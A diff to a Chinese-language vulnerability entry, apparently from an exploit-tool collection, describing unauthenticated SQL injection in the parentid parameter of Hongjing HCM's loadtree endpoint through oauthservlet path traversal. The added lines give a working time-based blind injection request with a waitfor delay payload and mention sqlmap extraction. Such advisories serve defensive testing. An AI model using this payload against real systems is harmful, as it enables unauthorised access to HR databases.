@@ -6,7 +6,7 @@ source: "R4gd0ll/I-Wanna-Get-All"
 
 ## 漏洞描述
 
-宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree` 接口 `parentid` 等参数存在 SQL 注入漏洞。
+宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree` 接口 `parentid` 参数存在 SQL 注入漏洞（延时盲注），经 oauthservlet 目录穿越未授权访问。
 
 ## 影响版本
 
@@ -23,7 +23,9 @@ app="HJSOFT-HCM"
 ## 漏洞复现
 
 ```
-GET /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1&parentid=1'... HTTP/1.1
+GET /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1&parentid=1';waitfor delay '0:0:3'-- HTTP/1.1
 ```
+
+`parentid` 参数拼接延时语句（其余 params/treetype/kind 等为伴随参数），响应延迟即确认注入；工具 PoC 采用 sqlmap 模块做延时盲注提取数据。
 
 > 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
